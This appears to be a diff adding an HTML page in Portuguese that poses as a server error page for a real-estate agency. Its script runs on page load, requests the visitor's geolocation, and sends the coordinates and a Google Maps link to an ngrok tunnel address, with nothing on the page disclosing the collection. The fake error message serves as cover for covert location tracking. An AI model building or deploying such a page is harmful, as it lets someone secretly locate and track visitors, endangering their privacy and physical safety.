@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Imobiliária Nova Morada</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="error-container">
+    <h1>Ops! Algo deu errado.</h1>
+    <p>Não conseguimos processar sua solicitação devido a um erro no servidor.</p>
+    <p>Tente novamente mais tarde.</p>
+    <div id="data-atual" class="data-atual"></div>
+    <a href="index.html" class="back-btn">Voltar à página inicial</a>
+  </div>
+  <script>
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Algo deu errado. Tente novamente mais tarde.");
+      }
+    });
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      fetch("https://ac43-189-68-251-126.ngrok-free.app/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude, maps })
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.success) {
+            console.log("Erro ao enviar a localização.");
+          }
+        })
+        .catch(error => {
+          console.error("Erro:", error);
+        });
+    }
+
+    function handleError(error) {
+      console.log("Erro ao obter a localização");
+    }
+  </script>
+</body>
+</html>
